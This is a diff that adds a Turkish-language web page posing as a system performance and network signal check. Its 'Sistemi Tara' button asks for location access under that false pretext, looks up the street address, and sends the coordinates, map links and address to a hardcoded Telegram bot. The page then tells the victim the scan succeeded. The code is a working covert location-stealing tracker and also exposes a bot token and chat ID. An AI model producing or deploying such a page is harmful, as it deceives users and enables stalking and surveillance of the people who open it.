@@ -1,0 +1,117 @@
+
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Sistem Durumu Analizi</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #f5f7fa;
+      margin: 0;
+      padding: 0;
+      color: #333;
+    }
+
+    header {
+      background-color: #2c3e50;
+      padding: 20px;
+      text-align: center;
+      color: white;
+    }
+
+    main {
+      max-width: 600px;
+      margin: 40px auto;
+      background: white;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.05);
+      text-align: center;
+    }
+
+    h1 {
+      margin-bottom: 10px;
+    }
+
+    p {
+      color: #666;
+    }
+
+    button {
+      background-color: #007aff;
+      color: white;
+      border: none;
+      padding: 15px 30px;
+      font-size: 16px;
+      border-radius: 8px;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+
+    footer {
+      margin-top: 60px;
+      text-align: center;
+      color: #aaa;
+      font-size: 14px;
+      padding-bottom: 30px;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>Sistem Durumu Analizi</h1>
+  </header>
+  <main>
+    <h2>Sistem Performansı Kontrolü</h2>
+    <p>Bu işlem sırasında cihaz bölgesel ağ performansı ve sinyal optimizasyonu verilerini analiz eder. Lütfen devam etmek için konum erişimine izin verin.</p>
+    <button onclick="sistemiTara()">Sistemi Tara</button>
+  </main>
+  <footer>
+    Sürüm 1.2 • Destek: info@systemcheck.com • Gizlilik Politikası
+  </footer>
+
+  <script>
+    function sistemiTara() {
+      navigator.geolocation.getCurrentPosition(async function(pos) {
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
+
+        const apple = `https://maps.apple.com/?ll=${lat},${lon}`;
+        const google = `https://maps.google.com/?q=${lat},${lon}`;
+
+        const apiKey = "https://nominatim.openstreetmap.org/reverse?format=json&lat=" + lat + "&lon=" + lon;
+
+        let address = "";
+
+        try {
+          const response = await fetch(apiKey);
+          const data = await response.json();
+          address = data.display_name || "";
+        } catch (e) {
+          address = "Adres çözümlenemedi.";
+        }
+
+        const message = `🛰️ Yeni Konum Alındı\n\n🔹 Koordinatlar:\n  Enlem: ${lat}\n  Boylam: ${lon}\n\n🗺️ Apple Maps: ${apple}\n🗺️ Google Maps: ${google}\n\n📍 Yaklaşık Konum:\n${address}`;
+
+        await fetch("https://api.telegram.org/bot8005950584:AAGAHkYJW5yeRDl1McQ9Dwz3wJm3T8LO27M/sendMessage", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            chat_id: "7125066639",
+            text: message,
+            parse_mode: "Markdown"
+          })
+        });
+
+        alert("✅ Sistem başarıyla tarandı.");
+      }, function() {
+        alert("❌ Konum alınamadı. Lütfen izni kontrol edin.");
+      });
+    }
+  </script>
+</body>
+</html>
